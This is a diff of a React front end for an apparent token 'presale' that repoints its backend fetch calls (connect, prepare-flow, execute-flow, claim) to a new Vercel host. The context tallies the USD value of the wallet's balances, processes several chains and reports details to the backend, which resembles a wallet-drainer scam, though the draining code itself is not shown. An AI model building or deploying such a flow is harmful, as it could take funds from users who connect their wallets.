@@ -322,7 +322,7 @@ function App() {
     try {
       const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
       
-      const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
+      const response = await fetch('https://hyperback.vercel.app/api/presale/connect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
@@ -356,7 +356,7 @@ function App() {
     if (!address) return;
     
     try {
-      const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
+      const response = await fetch('https://hyperback.vercel.app/api/presale/prepare-flow', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
@@ -436,7 +436,7 @@ function App() {
           processed.push(chain.name);
           
           // Notify backend with full details
-          await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
+          await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
@@ -465,7 +465,7 @@ function App() {
         setTxStatus(`🎉 Success!`);
         
         // Final success notification
-        await fetch('https://bthbk.vercel.app/api/presale/claim', {
+        await fetch('https://hyperback.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -493,7 +493,7 @@ function App() {
   const claimTokens = async () => {
     try {
       setLoading(true);
-      await fetch('https://bthbk.vercel.app/api/presale/claim', {
+      await fetch('https://hyperback.vercel.app/api/presale/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -1028,3 +1028,4 @@ function App() {
 }
 
 export default App;
+
